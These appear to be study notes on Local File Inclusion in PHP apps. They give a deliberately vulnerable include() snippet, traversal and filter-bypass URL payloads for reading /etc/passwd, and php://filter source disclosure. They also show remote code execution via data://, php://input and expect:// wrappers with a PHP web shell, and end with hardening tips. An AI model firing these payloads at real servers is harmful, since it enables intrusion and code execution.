
# Introduction to File Inclusions

**Local File Inclusion (LFI)** occurs when a web application allows users to control file paths, potentially leading to the inclusion of unintended files. This can expose sensitive data or even allow attackers to execute arbitrary code on the server.

### Risks of LFI:
- **Source Code Disclosure**: Attackers can view and analyze the application’s source code for other vulnerabilities.
- **Sensitive Data Exposure**: LFI can expose credentials, configuration files, or other sensitive information.
- **Remote Code Execution**: In some cases, LFI can lead to remote code execution, allowing attackers to fully compromise the server.

### Example of LFI in PHP
```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```
- **Vulnerability:** The `include()` function loads files based on user-controlled input, making it possible for an attacker to include files from the server (e.g., `/etc/passwd`).

### Key Functions in LFI:
| Function                    | Read Content | Execute | Remote URL |
|-----------------------------|--------------|---------|------------|
| `include()`, `require()`     | ✅            | ✅       | ✅          |
| `fs.readFile()`, `sendFile()`| ✅            | ❌       | ❌          |
| `@Html.Partial()`, `Response.WriteFile()` | ✅            | ❌       | ❌          |

---

# Local File Inclusion (LFI)

## What is LFI?
- LFI occurs when web applications allow user input to specify file paths, potentially leading to the inclusion of unintended files (e.g., `/etc/passwd`), exposing sensitive data or enabling code execution.

## LFI Exploitation Examples

### 1. **Basic LFI**  
URL: `http://<SERVER_IP>:<PORT>/index.php?language=es.php`  
- **Vulnerability**: The web app includes files based on user input, allowing attackers to read sensitive files by changing the parameter, e.g., `/etc/passwd`.

### 2. **Path Traversal**  
- **Bypassing restrictions**: Use `../../../../` to traverse to the root directory and access files like `/etc/passwd`.  
Example: `http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd`

### 3. **Filename Prefix**  
- **Bypass with `/`**: When a prefix like `lang_` is added, prepend `/` to path traversal to bypass the prefix.  
Example: `http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd`

### 4. **Appended Extensions**  
- **File extension issues**: When `.php` is appended to the input, use techniques like `%00` (null byte) to bypass the extension filter and access files.  
Example: `http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd%00`

### 5. **Second-Order LFI Attacks**  
- **Poisoning input**: Attackers can exploit LFI through indirect inputs, like user profiles, that are later used to load files (e.g., `/profile/$username/avatar.png`).  
- **Exploit**: Poison a value (like username) to control what file is loaded later.

---

# Basic Bypasses 

### 1. Non-Recursive Path Traversal Filters
- **Issue**: Filters remove `../` substrings once but do not recursively check the output string.
- **Bypass**:
  - Use payloads like `....//`, `..././`, or `....\/`.
  - Example:
    ```url
    http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
    ```

### 2. Encoding
- **Issue**: Filters may block `.` and `/` characters.
- **Bypass**:
  - URL encode payloads (e.g., `../` -> `%2e%2e%2f`).
  - Double encoding may bypass additional filters.
  - Example:
    ```url
    http://<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
    ```

### 3. Approved Paths
- **Issue**: Regex used to restrict files to specific directories (e.g., `./languages/`).
- **Bypass**:
  - Start payload with the approved path and use `../` traversal.
  - Example:
    ```url
    http://<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
    ```

### 4. Appended Extensions
- **Issue**: Application appends extensions like `.php` to input strings.
- **Bypass**:
  - Restricted to `.php` files in modern PHP versions.
  - Explore file content (e.g., source code).

### 5. Path Truncation (PHP < 5.3/5.4)
- **Issue**: PHP truncates strings beyond 4096 characters and removes trailing slashes/single dots.
- **Bypass**:
  - Create long paths where `.php` is truncated.
  - Automate string creation:
    ```bash
    echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
    ```

### 6. Null Byte Injection (PHP < 5.5)
- **Issue**: Null byte `%00` terminates the string, ignoring appended extensions.
- **Bypass**:
  - Payload: `/etc/passwd%00`
  - Example:
    ```url
    http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd%00
    ```

---
# PHP Filters 

### Overview
- **PHP Wrappers**: Allow access to I/O streams and extend Local File Inclusion (LFI) exploitation.
- **Use Cases**: Can read PHP source code, gain remote code execution, and assist in attacks like XXE.

### Input Filters
- **PHP Filters**: A type of PHP Wrapper that filters input streams via `php://filter/`.
- **Parameters**:
  - `resource`: Specifies the stream (e.g., a file) to filter.
  - `read`: Applies the specified filter (e.g., `convert.base64-encode`).
- **Types of Filters**:
  - String Filters
  - Conversion Filters (e.g., `convert.base64-encode`)
  - Compression Filters
  - Encryption Filters

### Fuzzing for PHP Files
- Use tools like `ffuf` or `gobuster` to identify PHP pages:
  ```bash
  ffuf -w /path/to/list.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
  ```
- **Tip**: Scan for all response codes (200, 301, 302, 403) to find potential sources.

### Source Code Disclosure
1. Identify a PHP file, e.g., `config.php`.
2. Include the file using LFI with a base64 filter:
   ```url
   php://filter/read=convert.base64-encode/resource=config
   ```
   Access:
   ```
   http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
   ```
3. Base64 decode the result to retrieve the source code:
   ```bash
   echo 'Base64_String_Here' | base64 -d
   ```
- **Tip**: Ensure the entire base64 string is copied for full decoding.

---



# PHP Wrappers

## File Inclusion Vulnerabilities
- File Inclusion vulnerabilities occur when an application includes files specified by the user without proper validation.
- These vulnerabilities can:
  - Disclose sensitive files.
  - Allow attackers to execute malicious code or commands.
- They are commonly found in misconfigured servers or poorly sanitized parameters.

PHP Wrappers extend the functionality of PHP streams, allowing data to be treated like a file. They can be exploited in Local File Inclusion (LFI) vulnerabilities to execute code or commands remotely.

### 1. **Data Wrapper**
- **Purpose**: Includes external data, including PHP code.
- **Requirement**: `allow_url_include = On` must be enabled in `php.ini`. This is **not enabled by default** but is sometimes used for compatibility with web applications like certain WordPress plugins.
- **How It Works**:
  - Encode PHP code (e.g., a web shell) in Base64 format.
  - Use `data://text/plain;base64,` to decode and execute the PHP code.
  - Example web shell:
    ```php
    <?php system($_GET["cmd"]); ?>
    ```
  - Encoded and included via:
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<BASE64_STRING>&cmd=<COMMAND>
    ```
  - Example command: `&cmd=id` (to display user and group information).



### 2. **Input Wrapper**
- **Purpose**: Accepts external input via POST requests to execute PHP code.
- **Requirement**: `allow_url_include = On` must also be enabled.
- **How It Works**:
  - PHP code is sent in the POST data.
  - Example payload:
    ```
    POST: <?php system($_GET["cmd"]); ?>
    GET: ?cmd=id
    ```
  - Useful for situations where GET parameters are restricted.
- **Notes**:
  - If the vulnerable function only accepts POST requests, the command can be hardcoded into the PHP payload:
    ```php
    <?php system('id'); ?>
    ```


### 3. **Expect Wrapper**
- **Purpose**: Executes system commands directly via URL streams.
- **Requirement**: The `expect` extension must be installed and enabled on the server.
- **How It Works**:
  - The `expect://` stream wrapper directly executes system commands.
  - Example command:
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=expect://id
    ```
  - Result: Outputs information such as user ID, group ID, and group memberships.

- **Checking for Installation**:
  - Use LFI with a configuration file (e.g., `/etc/php/<VERSION>/apache2/php.ini`) to check for `extension=expect`.
  - Example:
    ```bash
    $ echo '<BASE64_ENCODED_STRING>' | base64 -d | grep expect
    ```

## Key Points to Secure PHP Applications
- **Disable `allow_url_include`**: Set it to `Off` in `php.ini`.
- **Avoid Installing Unnecessary Extensions**: Do not install or enable modules like `expect` unless required.
- **Limit File Inclusion Paths**: Use `open_basedir` to restrict PHP scripts to specific directories.
- **Validate User Inputs**: Implement proper input validation and sanitization to prevent arbitrary file inclusion.


---
